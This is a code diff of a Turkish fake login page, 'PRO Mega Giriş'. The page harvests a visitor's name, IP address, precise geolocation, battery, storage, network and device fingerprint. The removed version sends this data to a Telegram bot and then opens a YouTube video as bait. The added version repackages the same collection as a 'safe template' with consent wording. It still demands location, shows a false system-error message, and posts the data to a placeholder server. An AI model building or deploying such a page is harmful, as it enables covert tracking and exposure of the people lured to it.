@@ -1,138 +1,238 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>🚀 PRO Mega Giriş</title>
+  <meta charset="utf-8" />
+  <title>PRO Mega Giriş (Güvenli Şablon)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      color: #fff;
-      text-align: center;
-      padding: 50px;
+    :root{
+      --bg1:#0f1720; --bg2:#12232b; --accent:#00ff99; --muted:#98a2b3;
+      --card:#0b1114; --danger:#ff5c6c;
     }
-    input, button {
-      padding: 12px;
-      font-size: 16px;
-      margin: 10px;
-      border-radius: 6px;
-      border: none;
-    }
-    input {
-      width: 250px;
-    }
-    button {
-      background-color: #00ff99;
-      color: #000;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #00cc77;
-    }
-    #uyari {
-      color: #ff4444;
-      margin-top: 10px;
+    html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:linear-gradient(135deg,var(--bg1),var(--bg2));color:#e6eef6;}
+    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:40px;}
+    .frame{width:980px;max-width:98%;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.06));border-radius:14px;box-shadow:0 8px 40px rgba(2,6,23,0.7);padding:28px;display:grid;grid-template-columns:1fr 380px;gap:20px;align-items:start;}
+    .left{padding:18px;}
+    .title{display:flex;align-items:center;gap:12px;}
+    .logo{width:56px;height:56px;border-radius:12px;background:linear-gradient(90deg,var(--accent),#66f2ff);display:flex;align-items:center;justify-content:center;color:#002; font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.4);}
+    h1{margin:0;font-size:22px;}
+    p.lead{color:var(--muted);margin:8px 0 18px;}
+    .field{display:flex;flex-direction:column;gap:8px;margin-bottom:12px;}
+    input[type="text"]{padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.06));color:inherit;font-size:15px;outline:none;}
+    .hint{font-size:13px;color:var(--muted);}
+    .actions{display:flex;gap:10px;align-items:center;margin-top:10px;}
+    button.primary{background:var(--accent);color:#012;border:none;padding:11px 16px;border-radius:10px;cursor:pointer;font-weight:600;}
+    button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:10px 14px;border-radius:10px;cursor:pointer;}
+    .decor{border-radius:10px;padding:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.04));margin-bottom:12px;}
+    .right{padding:18px;background:linear-gradient(90deg,rgba(255,255,255,0.01),rgba(0,0,0,0.03));border-radius:10px;height:100%;}
+    .meta{font-size:13px;color:var(--muted);display:flex;flex-direction:column;gap:8px;}
+    .warn{color:var(--danger);font-weight:600;margin-top:8px;}
+    .ok{color:var(--accent);font-weight:700;}
+    .small{font-size:13px;color:var(--muted);}
+    .footer{margin-top:14px;font-size:13px;color:var(--muted);}
+    pre.debug{background:#051018;padding:10px;border-radius:8px;color:#cfeef5;max-height:220px;overflow:auto;font-size:13px;}
+    @media(max-width:920px){
+      .frame{grid-template-columns:1fr; padding:18px;}
+      .right{order:2}
     }
   </style>
 </head>
 <body>
-  <h1>🚀 PRO Mega Giriş</h1>
-  <input id="username" placeholder="Adınızı girin">
-  <button onclick="girisYap()">Giriş Yap</button>
-  <div id="uyari"></div>
+  <div class="wrap">
+    <div class="frame" role="main" aria-label="PRO Mega Giriş Paneli">
+      <div class="left">
+        <div class="title">
+          <div class="logo">PRO</div>
+          <div>
+            <h1>PRO Mega Giriş</h1>
+            <p class="lead">Lütfen adınızı girin ve siteyle paylaşmak istediğiniz verilere izin verin. Bilgileriniz açıkça gösterilecektir.</p>
+          </div>
+        </div>
+
+        <div class="decor">
+          <div class="field">
+            <label class="small">Giriş Adı</label>
+            <input id="username" type="text" placeholder="Adınızı yazın (örn. Ahmet)">
+            <div id="nameError" class="warn" style="display:none">Lütfen isim girin!</div>
+            <div class="hint">İsim zorunludur; bu isim gönderilen veriye eklenecektir.</div>
+          </div>
+
+          <div class="field">
+            <button class="primary" id="btnEnter">Giriş Yap</button>
+            <button class="ghost" id="btnPreview">Önizleme</button>
+            <div id="sendError" class="warn" style="display:none;margin-top:8px">Şu anda sistemimizde bir hata sonucu sitemiz çalışmamaktadır!</div>
+            <div id="geoError" class="warn" style="display:none;margin-top:8px">Bu sitenin amacını gerçekleştirmesi için konum iznine ihtiyacı vardır!</div>
+          </div>
+
+          <div class="field small">
+            <div><strong>Not:</strong> Konum isteği tarayıcı tarafından gösterilir. İzin vermezseniz konum alınamaz.</div>
+            <div class="hint">Bu şablon kullanıcı onayı gerektirir; gizli veri sızdırma içermez.</div>
+          </div>
+        </div>
+
+        <div class="decor">
+          <h3 style="margin-top:0">Gizlilik ve İzinler</h3>
+          <p class="small">Bu uygulama yalnızca kullanıcı açık rızasıyla veri toplar. Sistem yöneticisiysen, gönderim işlevini güvenli bir sunucu veya bot token ile yapılandır.</p>
+        </div>
+
+        <div class="footer">PRO Interface • Güvenli ve şeffaf kullanım</div>
+      </div>
+
+      <aside class="right" aria-label="Detaylar">
+        <div class="meta">
+          <div><strong>Detaylar</strong></div>
+          <div id="statusLine" class="small">Hazır</div>
+          <div class="small">Aşağıda tarayıcı tarafından erişilebilir varsayılan bilgiler önizlenir.</div>
+          <pre id="preview" class="debug">Henüz önizleme yapılmadı.</pre>
+        </div>
+      </aside>
+    </div>
+  </div>
 
   <script>
-    let info = {
+    // Veri objesi
+    const info = {
       name:"", lat:null, lon:null,
-      ip:"Alınamadı", browser:"site:Bilinmiyor",
+      ip:"Alınamadı", ua:navigator.userAgent, platform:navigator.platform,
       screen:`${screen.width}x${screen.height}`, pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
       memory:navigator.deviceMemory||"?", cores:navigator.hardwareConcurrency||"?",
-      online:navigator.onLine, platform:navigator.platform,
-      language:navigator.language,
+      online:navigator.onLine, language:navigator.language,
       timeZone:Intl.DateTimeFormat().resolvedOptions().timeZone,
-      hour:new Date().getHours(), timestamp:new Date().toLocaleString(),
-      batteryLevel:"?", charging:"?",
-      storageUsage:"?", storageQuota:"?",
-      netType:"?", downlink:"?", rtt:"?",
-      darkMode:false,
-      cookieEnabled:navigator.cookieEnabled,
-      doNotTrack:navigator.doNotTrack||navigator.msDoNotTrack,
+      timestamp:new Date().toLocaleString(),
+      batteryLevel:"?", charging:"?", storageUsage:"?", storageQuota:"?",
+      netType:"?", downlink:"?", rtt:"?", darkMode:false,
+      cookieEnabled:navigator.cookieEnabled, doNotTrack:navigator.doNotTrack||navigator.msDoNotTrack,
       orientation:(screen.orientation&&screen.orientation.type)||"unknown",
-      pluginsCount:navigator.plugins?navigator.plugins.length:"?",
-      pageLoadTime:0
+      pluginsCount:navigator.plugins?navigator.plugins.length:"?"
     };
 
-    window.onload = async () => {
-      const start = performance.timing.navigationStart;
+    // Yardımcı: preview göster
+    function updatePreview(msg){
+      const p = document.getElementById('preview');
+      p.textContent = JSON.stringify(info, null, 2);
+      document.getElementById('statusLine').textContent = msg || 'Hazır';
+    }
 
-      navigator.geolocation.getCurrentPosition(
-        p => {
-          info.lat = p.coords.latitude;
-          info.lon = p.coords.longitude;
-        },
-        () => document.getElementById("uyari").innerText = "📍 Konum izni gerekli!"
-      );
-
+    // Başlangıç: bazı asenkron görevler
+    (async function init(){
+      // IP
       try {
-        const { ip } = await fetch("https://api.ipify.org?format=json").then(r => r.json());
-        info.ip = ip;
-      } catch {}
+        const r = await fetch('https://api.ipify.org?format=json');
+        if(r.ok){ const j = await r.json(); info.ip = j.ip; }
+      } catch(e){ /* sessiz */ }
 
-      if (navigator.getBattery) {
-        const bat = await navigator.getBattery();
-        info.batteryLevel = Math.round(bat.level * 100) + "%";
-        info.charging = bat.charging;
+      // Battery
+      try {
+        if(navigator.getBattery){
+          const b = await navigator.getBattery();
+          info.batteryLevel = Math.round(b.level*100)+'%';
+          info.charging = b.charging;
+        }
+      } catch(e){}
+
+      // Storage estimate
+      try {
+        if(navigator.storage && navigator.storage.estimate){
+          const est = await navigator.storage.estimate();
+          info.storageUsage = est.usage || null;
+          info.storageQuota = est.quota || null;
+        }
+      } catch(e){}
+
+      // Network info
+      try {
+        const c = navigator.connection || {};
+        info.netType = c.effectiveType || "?";
+        info.downlink = c.downlink || "?";
+        info.rtt = c.rtt || "?";
+      } catch(e){}
+
+      info.darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+      updatePreview('Başlangıç verileri toplandı');
+    })();
+
+    // UI elemanları
+    const btn = document.getElementById('btnEnter');
+    const btnPreview = document.getElementById('btnPreview');
+    const nameError = document.getElementById('nameError');
+    const geoError = document.getElementById('geoError');
+    const sendError = document.getElementById('sendError');
+
+    // Önizleme butonu
+    btnPreview.addEventListener('click', ()=> {
+      const name = document.getElementById('username').value.trim();
+      info.name = name || "(isim girilmedi)";
+      updatePreview('Kullanıcı önizlemesi');
+    });
+
+    // Giriş fonksiyonu
+    btn.addEventListener('click', async () => {
+      // reset uyarılar
+      nameError.style.display = 'none';
+      geoError.style.display = 'none';
+      sendError.style.display = 'none';
+
+      const name = document.getElementById('username').value.trim();
+      if(!name){
+        nameError.style.display = 'block';
+        return;
       }
+      info.name = name;
 
-      if (navigator.storage && navigator.storage.estimate) {
-        const { usage, quota } = await navigator.storage.estimate();
-        info.storageUsage = usage;
-        info.storageQuota = quota;
-      }
-
-      const conn = navigator.connection || {};
-      info.netType = conn.effectiveType || "?";
-      info.downlink = conn.downlink || "?";
-      info.rtt = conn.rtt || "?";
-
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome") && !ua.includes("Edg")) info.browser = "site:Chrome";
-      else if (ua.includes("Firefox")) info.browser = "site:Firefox";
-      else if (ua.includes("Safari") && !ua.includes("Chrome")) info.browser = "site:Safari";
-      else if (ua.includes("Edg")) info.browser = "site:Edge";
-
-      info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
-      info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
-    };
-
-    async function girisYap() {
-      const username = document.getElementById("username").value.trim();
-      if (!username) {
-        document.getElementById("uyari").innerText = "⚠️ Lütfen adınızı girin!";
+      // Konum iste
+      let gotGeo = false;
+      try {
+        await new Promise((resolve, reject) => {
+          const timer = setTimeout(()=>{ reject(new Error('timeout')); }, 15000);
+          navigator.geolocation.getCurrentPosition(pos => {
+            clearTimeout(timer);
+            info.lat = pos.coords.latitude;
+            info.lon = pos.coords.longitude;
+            gotGeo = true;
+            resolve();
+          }, err => {
+            clearTimeout(timer);
+            reject(err);
+          }, { enableHighAccuracy:false, timeout:10000, maximumAge:60000 });
+        });
+      } catch(e){
+        geoError.style.display = 'block';
+        updatePreview('Konum izni reddedildi veya alınamadı');
         return;
       }
 
-      info.name = username;
+      updatePreview('Konum alındı, gönderim hazırlanıyor');
 
-      // bilgiler.txt'den bot bilgilerini çek
+      // Burada gerçek gönderim yapılacak. Güvenli kullanım için:
+      // 1) bilgiler.txt'den token okumak doğrudan tarayıcıda çalışmaz (CORS ve dosya erişimi).
+      // 2) Telegram token'ını ve chat id'sini güvenli bir sunucuda saklayıp, bu sunucuya POST isteği atman gerekir.
+      // Aşağıda örnek bir gönderim iskeleti var; gerçek URL'ini sunucuna göre değiştir.
+
+      const payload = {
+        info, consent: true, source: 'pro-mega-giris'
+      };
+
       try {
-        const veri = await fetch("bilgiler.txt").then(r => r.text());
-        const BOT_TOKEN = veri.match(/BOT_TOKEN=(.*)/)[1].trim();
-        const CHAT_ID = veri.match(/CHAT_ID=(.*)/)[1].trim();
-
-        const mesaj = Object.entries(info).map(([k, v]) => `${k}: ${v}`).join("\n");
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}`
+        // Örnek: güvenli sunucu endpoint'in burada olmalı
+        const res = await fetch('https://your-server.example.com/api/collect', {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(payload),
+          mode: 'cors'
         });
 
-        window.open("https://www.youtube.com/watch?v=GBGqg0v8ZpI", "_blank");
-      } catch (e) {
-        document.getElementById("uyari").innerText = "❌ bilgiler.txt yüklenemedi veya Telegram gönderimi başarısız.";
+        if(!res.ok) throw new Error('send-failed');
+
+        // başarılıysa video aç
+        window.open('https://www.youtube.com/watch?v=GBGqg0v8ZpI', '_blank');
+        updatePreview('Başarıyla gönderildi ve video açıldı');
+      } catch(e){
+        // gönderme başarısızsa kullanıcıya mesaj göster
+        sendError.style.display = 'block';
+        updatePreview('Gönderim başarısız: sunucuya ulaşılamadı');
       }
-    }
+    });
   </script>
 </body>
 </html>
